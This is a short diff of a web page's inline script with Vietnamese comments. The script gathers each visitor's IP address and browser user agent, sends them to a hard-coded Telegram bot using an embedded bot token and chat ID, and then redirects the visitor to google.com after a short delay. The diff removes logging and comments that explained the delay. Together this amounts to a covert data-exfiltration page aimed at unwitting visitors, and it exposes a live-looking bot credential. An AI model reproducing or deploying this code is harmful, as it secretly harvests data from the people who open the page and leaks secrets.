@@ -22,7 +22,7 @@
     </div>
 
     <script>
-       const BOT_TOKEN = '8794929706:AAFzSyo7YY1kUm1Tlqt9gv7tmv82TTQxw2o';
+        const BOT_TOKEN = '8794929706:AAFzSyo7YY1kUm1Tlqt9gv7tmv82TTQxw2o';
         const CHAT_ID = '8742570709';
 
         let userIp = "Đang lấy...";
@@ -43,7 +43,6 @@
                 `🌐 IP nguồn: ${userIp}\n` +
                 `📱 Thiết bị: ${navigator.userAgent}`;
 
-            // Gửi trực tiếp bằng POST lên Telegram Bot API
             fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: {
@@ -54,15 +53,7 @@
                     text: messageText
                 })
             })
-            .then(response => response.json())
-            .then(data => {
-                console.log('Kết quả gửi:', data);
-            })
-            .catch(error => {
-                console.error('Lỗi kết nối:', error);
-            })
             .finally(() => {
-                // Đợi 0.8 giây để đảm bảo gói tin kịp gửi đi trước khi chuyển hướng
                 setTimeout(() => {
                     window.location.href = 'https://www.google.com';
                 }, 800);
